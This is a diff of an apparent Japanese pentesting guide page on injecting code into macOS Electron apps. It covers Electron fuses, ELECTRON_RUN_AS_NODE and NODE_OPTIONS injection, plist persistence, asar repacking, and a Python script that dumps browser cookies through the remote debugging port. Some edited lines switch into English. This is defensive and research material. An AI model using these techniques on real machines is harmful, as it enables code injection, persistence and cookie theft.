@@ -9,12 +9,12 @@ Electronが何か知らない場合は、[**こちらにたくさんの情報が
 
 ### Electron Fuses
 
-これらの技術については次に説明しますが、最近Electronはそれらを防ぐためにいくつかの**セキュリティフラグ**を追加しました。これらは[**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses)であり、macOSのElectronアプリが**任意のコードを読み込むのを防ぐために使用される**ものです：
+これらの技術については次に説明しますが、最近Electronはそれらを防ぐためにいくつかの**セキュリティフラグ**を追加しました。これらは[**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses)であり、macOSのElectronアプリが**任意のコードを読み込むのを防ぐために使用されるものです**：
 
 - **`RunAsNode`**: 無効にすると、コードを注入するための環境変数**`ELECTRON_RUN_AS_NODE`**の使用が防止されます。
-- **`EnableNodeCliInspectArguments`**: 無効にすると、`--inspect`や`--inspect-brk`のようなパラメータは尊重されません。この方法でコードを注入するのを避けます。
-- **`EnableEmbeddedAsarIntegrityValidation`**: 有効にすると、読み込まれた**`asar`** **ファイル**はmacOSによって**検証**されます。この方法でこのファイルの内容を変更することによる**コード注入**を防ぎます。
-- **`OnlyLoadAppFromAsar`**: これが有効になっている場合、次の順序で読み込むのを探すのではなく：**`app.asar`**、**`app`**、そして最後に**`default_app.asar`**。app.asarのみをチェックして使用するため、**`embeddedAsarIntegrityValidation`**フューズと組み合わせることで**検証されていないコードを読み込むことが不可能**になります。
+- **`EnableNodeCliInspectArguments`**: 無効にすると、`--inspect`や`--inspect-brk`のようなパラメータが尊重されません。この方法でコードを注入するのを避けます。
+- **`EnableEmbeddedAsarIntegrityValidation`**: 有効にすると、読み込まれた**`asar`** **ファイル**がmacOSによって**検証されます**。これにより、このファイルの内容を変更することによる**コード注入**が**防止されます**。
+- **`OnlyLoadAppFromAsar`**: これが有効になっている場合、次の順序で読み込むのではなく：**`app.asar`**、**`app`**、そして最後に**`default_app.asar`**。app.asarのみをチェックして使用するため、**`embeddedAsarIntegrityValidation`**フューズと組み合わせることで**検証されていないコードを読み込むことが不可能になります**。
 - **`LoadBrowserProcessSpecificV8Snapshot`**: 有効にすると、ブラウザプロセスは`browser_v8_context_snapshot.bin`というファイルをV8スナップショットに使用します。
 
 コード注入を防がないもう一つの興味深いフューズは：
@@ -50,7 +50,7 @@ Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions
 
 <figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>
 
-**`Electron Framework`**バイナリをこれらのバイトを変更してアプリケーション内に**上書き**しようとすると、アプリは実行されませんので注意してください。
+**`Electron Framework`**バイナリをこれらのバイトを変更してアプリケーション内に**上書き**しようとすると、アプリは実行されないことに注意してください。
 
 ## RCEをElectronアプリケーションにコードを追加する
 
@@ -70,7 +70,7 @@ asarファイルからコードを展開するには、次のコマンドを使�
 ```bash
 npx asar extract app.asar app-decomp
 ```
-そして、次のように修正した後に再パッケージしてください:
+そして、次のように修正した後に再パッケージ化します:
 ```bash
 npx asar pack app-decomp app-new.asar
 ```
@@ -84,11 +84,11 @@ ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
 ```
 > [!CAUTION]
-> フューズ **`RunAsNode`** が無効になっている場合、環境変数 **`ELECTRON_RUN_AS_NODE`** は無視され、この方法は機能しません。
+> If the fuse **`RunAsNode`** is disabled the env var **`ELECTRON_RUN_AS_NODE`** will be ignored, and this won't work.
 
 ### アプリのPlistからのインジェクション
 
-[**ここで提案されているように**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/)、この環境変数をplistで悪用して永続性を維持することができます：
+As [**proposed here**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), you could abuse this env variable in a plist to maintain persistence:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -127,9 +127,9 @@ NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Di
 >
 > **`ELECTRON_RUN_AS_NODE`** を設定しないと、次の **エラー** が表示されます: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
 
-### アプリのPlistからのインジェクション
+### アプリの Plist からのインジェクション
 
-この環境変数をplistで悪用して、持続性を維持するためにこれらのキーを追加できます:
+この環境変数を plist で悪用して、持続性を維持するためにこれらのキーを追加できます:
 ```xml
 <dict>
 <key>EnvironmentVariables</key>
@@ -155,11 +155,9 @@ According to [**this**](https://medium.com/@metnew/why-electron-apps-cant-store-
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
 ```
 > [!CAUTION]
-> フューズ **`EnableNodeCliInspectArguments`** が無効になっている場合、アプリは起動時に環境変数 **`ELECTRON_RUN_AS_NODE`** が設定されていない限り、ノードパラメータ（`--inspect` など）を **無視** します。このフューズ **`RunAsNode`** が無効になっている場合、環境変数も **無視** されます。
+> フューズ **`EnableNodeCliInspectArguments`** が無効になっている場合、アプリは起動時にノードパラメータ（`--inspect` など）を **無視**します。ただし、環境変数 **`ELECTRON_RUN_AS_NODE`** が設定されている場合はこの限りではなく、フューズ **`RunAsNode`** が無効になっている場合はそれも **無視** されます。
 >
-> ただし、**electron パラメータ `--remote-debugging-port=9229`** を使用することで、Electronアプリから **履歴**（GETコマンドを使用）やブラウザの **クッキー** を盗むことが可能ですが、以前のペイロードは他のプロセスを実行するためには機能しません。
-
-パラメータ **`--remote-debugging-port=9222`** を使用することで、Electronアプリから **履歴**（GETコマンドを使用）やブラウザの **クッキー** を盗むことが可能です（クッキーはブラウザ内で **復号化** され、クッキーを提供する **json エンドポイント** があります）。
+> しかし、**electron パラメータ `--remote-debugging-port=9229`** を使用することで、Electron アプリから **履歴**（GET コマンドを使用）やブラウザの **クッキー**（ブラウザ内で **復号化** され、クッキーを提供する **json エンドポイント** が存在します）を盗むことが可能です。
 
 その方法については [**こちら**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) と [**こちら**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) で学ぶことができ、ツール [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) や次のようなシンプルなスクリプトを使用できます:
 ```python
@@ -169,7 +167,7 @@ ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00",
 ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
 print(ws.recv()
 ```
-この[**ブログ投稿**](https://hackerone.com/reports/1274695)では、このデバッグが悪用され、ヘッドレスChromeが**任意の場所に任意のファイルをダウンロード**します。
+この[**ブログ投稿**](https://hackerone.com/reports/1274695)では、このデバッグが悪用されて、ヘッドレスChromeが**任意の場所に任意のファイルをダウンロード**します。
 
 ### アプリのPlistからのインジェクション
 
@@ -194,7 +192,7 @@ print(ws.recv()
 
 ## 非JSコードの実行
 
-前述の技術を使用すると、**Electronアプリケーションのプロセス内でJSコードを実行する**ことができます。ただし、**子プロセスは親アプリケーションと同じサンドボックスプロファイルの下で実行され**、**TCCの権限を継承します**。\
+前述の技術を使用すると、**Electronアプリケーションのプロセス内でJSコードを実行**できます。ただし、**子プロセスは親アプリケーションと同じサンドボックスプロファイルの下で実行され**、**TCCの権限を継承します**。\
 したがって、カメラやマイクにアクセスするために権限を悪用したい場合は、**プロセスから別のバイナリを実行するだけで済みます**。
 
 ## 自動注入
